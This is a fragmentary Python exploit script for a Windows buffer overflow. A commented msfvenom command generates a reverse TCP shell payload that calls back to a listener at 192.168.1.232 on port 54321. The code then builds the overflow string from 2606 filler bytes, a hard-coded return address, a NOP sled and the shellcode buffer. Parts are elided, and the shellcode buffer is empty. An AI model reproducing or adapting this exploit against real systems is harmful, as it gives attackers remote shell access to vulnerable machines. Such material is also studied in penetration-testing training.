...
# msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.232 lport=54321 --platform Windows -a x86 -b '\x00\x0a\x0d' -v payload -f python --smallest
buf =  ""
...
crash = "A" * 2606
crash += struct.pack('<L', 0x5F4A358F)
crash += "\x90" * 8
crash += buf
...
try:
	...
	try:
		...
		print "[!] Could not setup listening instance"
except:
